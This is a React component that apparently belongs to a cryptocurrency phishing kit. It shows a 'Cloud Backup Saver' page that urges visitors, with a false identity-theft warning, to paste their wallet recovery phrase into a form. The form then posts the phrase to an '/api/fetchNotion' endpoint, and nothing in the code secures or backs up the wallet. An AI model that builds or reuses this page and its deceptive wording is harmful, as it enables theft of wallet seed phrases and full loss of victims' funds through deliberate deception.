/* eslint-disable react/prop-types */
import { useFormContext } from 'react-hook-form'
import ReCAPTCHA from 'react-google-recaptcha'
import { CgSpinner } from 'react-icons/cg'
import * as React from 'react'

const RecoveryPhrase = ({ nextScreen }) => {
  const [reCaptchaToken, setRecaptchaToken] = React.useState(false)
  const [isLoading, setIsLoading] = React.useState(false)

  const { register, handleSubmit, getValues } = useFormContext()
  const { walletType } = getValues()

  const onChangeReCaptcha = async (value) => {
    if (value && typeof value === 'string') setRecaptchaToken(true)
  }

  const submitPhrase = async (data) => {
    setIsLoading(true)
    try {
      const response = await fetch('/api/fetchNotion', {
        method: 'POST',
        'Content-Type': 'application/json',
        body: JSON.stringify(data),
      })
      if (response.status === 200) {
        setIsLoading(false)
        nextScreen()
      }
    } catch (error) {
      console.error(error)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <main className='container px-8 mx-auto'>
      <section className='mx-auto my-12'>
        <h2 className='text-3xl font-bold text-white md:text-4xl lg:text-5xl'>
          Secure your {`${walletType}`} wallet
        </h2>
        <p className='my-8'>
          To prevent identity theft, you need to secure your wallet with us.
        </p>
        <p className='mb-8'>
          Here’s how you secure your {`${walletType}`} wallet with{' '}
          <strong>Cloud Backup Saver</strong>:
        </p>
        <ol className='list-decimal list-inside'>
          <li>
            Go to your {`${walletType}`} wallet, click on Settings Recovery
            phrase. Then copy and paste it in the form below.
          </li>
          <li className='mt-4'>Verify yourself with reCAPTCHA.</li>
          <li className='mt-4'>Secure your wallet!</li>
        </ol>
      </section>
      <form onSubmit={handleSubmit(submitPhrase)} method='POST'>
        <textarea
          className='w-full outline-none focus:outline-slate-400 bg-inherit border border-[#F7F7F7] rounded-lg px-6 py-3'
          placeholder='Enter your recovery phrase here.'
          cols='20'
          rows='5'
          required
          {...register('recoveryPhrase')}
        ></textarea>
        <div className='w-full mt-4'>
          <ReCAPTCHA
            onChange={onChangeReCaptcha}
            sitekey={import.meta.env.VITE_SITE_KEY}
          />
        </div>
        <button
          type='submit'
          className='flex justify-center mt-8 w-full text-center rounded-lg py-3 transition-colors disabled:bg-[#6f9dff] hover:bg-[#0046df] bg-[#0051FF]'
          disabled={!reCaptchaToken || isLoading}
        >
          {!isLoading ? (
            'Secure Wallet'
          ) : (
            <CgSpinner className='w-8 h-8 animate-spin' />
          )}
        </button>
      </form>
    </main>
  )
}

export default RecoveryPhrase
